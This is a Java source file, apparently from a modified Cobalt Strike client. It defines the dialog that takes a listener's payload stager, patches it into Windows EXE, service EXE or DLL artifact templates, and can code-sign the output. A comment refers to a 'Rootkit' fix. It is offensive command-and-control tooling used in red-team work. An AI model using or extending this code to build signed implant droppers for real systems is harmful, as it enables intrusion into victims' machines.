package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import common.ArtifactUtils;
import common.CommonUtils;
import common.ListenerUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;

import java.awt.event.ActionEvent;
import java.io.File;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class WindowsExecutableDialog implements DialogListener, SafeDialogCallback {

    protected JFrame dialog = null;

    protected AggressorClient client = null;

    protected Map options = null;

    protected byte[] stager;

    public WindowsExecutableDialog(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        this.options = map;
        String str1 = DialogUtils.string(map, "listener");

        //todo add fixed x64 Rootkit can not online bug
        boolean b = DialogUtils.bool(this.options, "x64");
        if (b) {
            this.stager = ListenerUtils.getListener(this.client, str1).getPayloadStager("x64");
        } else {
            this.stager = ListenerUtils.getListener(this.client, str1).getPayloadStager("x86");
        }
        // this.stager = ListenerUtils.getListener(this.client, str1).getPayloadStager("x86");
        if (this.stager.length == 0) {
            return;
        }
        String str2 = map.get("output") + "";
        String str3 = "";
        if (str2.indexOf("EXE") > -1) {
            str3 = "artifact.exe";
        } else if (str2.indexOf("DLL") > -1) {
            str3 = "artifact.dll";
        }
        SafeDialogs.saveFile(null, str3, this);
    }

    public void dialogResult(String string) {
        String str1 = this.options.get("output") + "";
        String str2 = this.options.get("listener") + "";
        boolean bool1 = DialogUtils.bool(this.options, "x64");
        boolean bool2 = DialogUtils.bool(this.options, "sign");
        if (bool1) {
            if (str1.equals("Windows EXE")) {
                (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact64.exe", string);
            } else if (str1.equals("Windows Service EXE")) {
                (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact64svc.exe", string);
            } else {
                if (str1.equals("Windows DLL (32-bit)")) {
                    DialogUtils.showError("I can't generate an x86 artifact for an x64 payload.");
                    return;
                }
                if (str1.equals("Windows DLL (64-bit)"))
                    (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact64.x64.dll", string);
            }
        } else if (str1.equals("Windows EXE")) {
            (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact32.exe", string);
        } else if (str1.equals("Windows Service EXE")) {
            (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact32svc.exe", string);
        } else if (str1.equals("Windows DLL (32-bit)")) {
            (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact32.dll", string);
        } else if (str1.equals("Windows DLL (64-bit)")) {
            (new ArtifactUtils(this.client)).patchArtifact(this.stager, "artifact64.dll", string);
        }
        if (bool2) {
            DataUtils.getSigner(this.client.getData()).sign(new File(string));
        }
        DialogUtils.showInfo("Saved " + str1 + " to\n" + string);
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("Windows Executable", 640, 480);
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.sc_listener_stagers("listener", "Listener:", this.client);
        dialogManager.combobox("output", "Output:", CommonUtils.toArray("Windows EXE, Windows Service EXE, Windows DLL (32-bit), Windows DLL (64-bit)"));
        dialogManager.checkbox_add("x64", "x64:", "Use x64 payload");
        dialogManager.checkbox_add("sign", "sign:", "Sign executable file", DataUtils.getSigner(this.client.getData()).available());
        JButton jButton1 = dialogManager.action("Generate");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-windows-exe");
        this.dialog.add(DialogUtils.description("This dialog generates a Windows executable. Use Cobalt Strike Arsenal scripts (Help -> Arsenal) to customize this process."), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }


}
